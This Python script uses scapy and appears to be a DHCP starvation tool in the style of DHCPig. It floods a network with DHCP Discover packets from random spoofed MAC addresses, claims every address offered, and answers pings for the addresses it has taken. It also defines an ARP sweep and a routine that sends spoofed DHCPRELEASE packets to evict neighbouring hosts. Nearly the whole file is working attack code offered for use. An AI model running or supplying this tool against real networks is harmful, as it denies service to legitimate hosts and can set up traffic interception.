#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import string, binascii, signal, sys, threading, socket, struct
from sys import stdout

MSGSCHEME = {'<--'      :"[<---] %s",   # inbound
             '-->'      :"[--->] %s",   # outpund
             '->'      :"[ -> ] %s",    # icmp / arp out
             '<-'      :"[ <- ] %s",    # icmp / arp in
             '?'        :"[ ?? ] %s",
             'DEBUG'    :"[DBG ] %s",
             'NOTICE'   :"[ -- ] %s",
             'WARNING'  :"[ !! ] %s",
             'ERROR'    :"[XXXX] %s",
             }
MSGSCHEME_MIN = {'<--'  :"!",
             '-->'      :".",
             '->'       :":",
             '<-'       :";",
             '?'        :"?",
             'DEBUG'    :"D",
             'NOTICE'   :"N",
             'WARNING'  :"W",
             'ERROR'    :"E",
             }
conf.checkIPaddr = False
conf.verb = False
SHOW_ARP = True
SHOW_ICMP = False
SHOW_DHCPOPTIONS = False
SHOW_LEASE_CONFIRM = False
DO_RELEASE = False
DO_ARP = False
MODE_FUZZ = False
MAC_LIST = []
TIMEOUT = {}
TIMEOUT['dos'] = 8
TIMEOUT['dhcpip'] = 2
TIMEOUT['timer'] = 0.4
VERBOSITY = 3
THREAD_CNT = 1
THREAD_POOL = []
REQUEST_OPTS = range(80)

def LOG(message=None, type=None):
    if VERBOSITY <= 0:
        return
    elif VERBOSITY == 1:
        if type in MSGSCHEME_MIN:
            message = MSGSCHEME_MIN[type]
            stdout.write("%s" % message)
            stdout.flush()
    else:
        if type in MSGSCHEME:
            message = MSGSCHEME[type] % message
        if MODE_FUZZ:
            stdout.write("[FUZZ] %s\n" % (message))
        else:
            stdout.write("%s\n" % (message))
        stdout.flush()

def signal_handler(signal, frame):
    LOG(type="NOTICE", message=' -----  ABORT ...  -----')
    i = 0
    for t in THREAD_POOL:
        t.kill_received = True
        LOG(type="DEBUG", message='Waiting for Thread %d to die ...' % i)
        i += 1
    sys.exit(0)

def randomMAC():
    global MAC_LIST
    if len(MAC_LIST) > 0:
        curr = MAC_LIST.pop()
        MAC_LIST = [curr] + MAC_LIST
        return curr
    mac = [0x11, 0x11,
           random.randint(0x00, 0x29),
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def toNum(ip):
    return struct.unpack('L', socket.inet_aton(ip))[0]

def get_if_net(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return ltoa(net)
    warning("No net address found for iface %s\n" % iff)

def get_if_msk(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return ltoa(msk)
    warning("No net address found for iface %s\n" % iff)

def get_if_ip(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return addr
    warning("No net address found for iface %s\n" % iff)

def calcCIDR(mask):
    mask = mask.split('.')
    bits = []
    for c in mask:
        bits.append(bin(int(c)))
    bits = ''.join(bits)
    cidr = 0
    for c in bits:
        if c == '1': cidr += 1
    return str(cidr)

def unpackMAC(binmac):
    mac = binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x + 2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)

def sendPacket(pkt):
    sendp(pkt, iface=conf.iface)

def neighbors():
    global dhcpsip, subnet, nodes
    nodes = {}
    if MODE_IPv6:
        LOG(type="WARNING", message="IPv6 - neighbors() not supported at this point ")
    else:
        myip = get_if_ip(conf.iface)
        LOG(type="DEBUG", message="NEIGHBORS:  net = %s  : msk =%s  : CIDR=%s" % (
        get_if_net(conf.iface), get_if_msk(conf.iface), calcCIDR(get_if_msk(conf.iface))))
        pool = Net(myip + "/" + calcCIDR(get_if_msk(conf.iface)))
        for ip in pool:
            LOG(type="<--", message="ARP: sending %s " % ip)
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, psrc=myip)
            sendPacket(arp_request)
            time.sleep(0.005)
            
def release():
    global dhcpsmac, dhcpsip, nodes, p_dhcp_advertise
    LOG(type="NOTICE", message="***  Sending DHCPRELEASE for neighbors ")
    for cmac, cip in nodes.iteritems():
        myxid = random.randint(1, 900000000)
        LOG(type="-->", message="Releasing %s - %s serverip=%s  xid=%i" % (cmac, cip, dhcpsip, myxid))
        dhcp_release = IP(src=cip, dst=dhcpsip) / UDP(sport=68, dport=67) / BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid) / \
                       DHCP(options=[("message-type", "release"), ("server_id", dhcpsip),
                                         ("client_id", chr(1), mac2str(cmac)), "end"])
        sendPacket(dhcp_release)
        if conf.verb: LOG(type="DEBUG", message="%r" % dhcp_release)

class send_dhcp(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
        global TIMEOUT, REQUEST_OPTS
        while not self.kill_received:
            m = randomMAC()
            myxid = random.randint(1, 900000000)
            mymac = get_if_hwaddr(conf.iface)
            hostname =  ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
            myoptions = [
                ("message-type", "discover"),
                ("param_req_list", chr(1), chr(121), chr(3), chr(6), chr(15), chr(119), chr(252), chr(95), chr(44),
                 chr(46)),
                ("max_dhcp_size", 1500),
                ("client_id", chr(1), mac2str(m)),
                ("lease_time", 10000),
                ("hostname", hostname),
                ("end", '00000000000000')
            ]

            dhcp_discover = Ether(src=mymac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67) / BOOTP(chaddr=[mac2str(m)], xid=myxid, flags=0xFFFFFF) / DHCP(options=myoptions)
            LOG(type="-->", message="DHCP_Discover")
            sendPacket(dhcp_discover)
            if TIMEOUT['timer'] > 0:
                time.sleep(TIMEOUT['timer'])

class sniff_dhcp(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
        self.kill_received = False
        self.dhcpcount = 0

    def run(self):
        global dhcpdos
        while not self.kill_received:
            sniff(filter=self.filter, prn=self.detect_dhcp, store=0, timeout=3, iface=conf.iface)
            if self.dhcpcount > 0: LOG(type="NOTICE",
                                       message="timeout waiting on dhcp packet count %d" % self.dhcpcount)
            self.dhcpcount += 1

    def detect_dhcp(self, pkt):
            if DHCP in pkt:
                if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
                    self.dhcpcount = 0
                    mymac = get_if_hwaddr(conf.iface)
                    myip = pkt[BOOTP].yiaddr
                    sip = pkt[BOOTP].siaddr
                    localxid = pkt[BOOTP].xid
                    localm = unpackMAC(pkt[BOOTP].chaddr)
                    myhostname = "FUZZME-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
                    LOG(type="<--", message="DHCP_Offer   " + pkt[
                        Ether].src + "\t" + sip + " IP: " + myip + " for MAC=[" + localm + "]")

                    dhcp_req = Ether(src=mymac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67) / BOOTP(chaddr=[mac2str(localm)], xid=localxid, flags=0xFFFFFF) / DHCP(
                        options=[("message-type", "request"), ("server_id", sip), ("requested_addr", myip),
                                 ("hostname", myhostname), ("param_req_list", "pad"), "end"])
                    LOG(type="-->", message="DHCP_Request " + myip)
                    sendPacket(dhcp_req)
                elif SHOW_LEASE_CONFIRM and pkt[DHCP] and pkt[DHCP].options[0][1] == 5:
                    myip = pkt[BOOTP].yiaddr
                    sip = pkt[BOOTP].siaddr
                    LOG(type="<-",
                        message="DHCP_ACK   " + pkt[Ether].src + "\t" + sip + " IP: " + myip + " for MAC=[" + pkt[
                            Ether].dst + "]")

            elif ICMP in pkt:
                if pkt[ICMP].type == 8:
                    myip = pkt[IP].dst
                    mydst = pkt[IP].src
                    if SHOW_ICMP: LOG(type="<-", message="ICMP_Request " + mydst + " for " + myip)
                    icmp_req = Ether(src=randomMAC(), dst=pkt.src) / IP(src=myip, dst=mydst) / ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq) / "12345678912345678912"
                    if conf.verb:
                        LOG(type="DEBUG", message="%r" % icmp_req)
                    sendPacket(icmp_req)

            elif SHOW_ARP and ARP in pkt:
                myip = pkt[ARP].pdst
                mydst = pkt[ARP].psrc
                if pkt[ARP].op == 1:  # op=1 who has, 2 is at
                    LOG(type="DEBUG", message="ARP_Request " + myip + " from " + mydst)
                elif pkt[ARP].op == 2:
                    myip = pkt[ARP].psrc
                    myhw = pkt[ARP].hwsrc
                    LOG(type="<-", message="ARP_Response %s : %s" % (myip, myhw))
                    nodes[myhw] = myip

def main():
    conf.iface = "eth0"
    LOG(type="NOTICE", message="[INFO] - using interface %s" % conf.iface)
    signal.signal(signal.SIGINT, signal_handler)
    LOG(type="DEBUG", message="Thread %d - (Sniffer) READY" % len(THREAD_POOL))
    t = sniff_dhcp()
    t.start()
    THREAD_POOL.append(t)

    for i in range(THREAD_CNT):
        LOG(type="DEBUG", message="Thread %d - (Sender) READY" % len(THREAD_POOL))
        t = send_dhcp()
        t.start()
        THREAD_POOL.append(t)

if __name__ == '__main__':
    main()
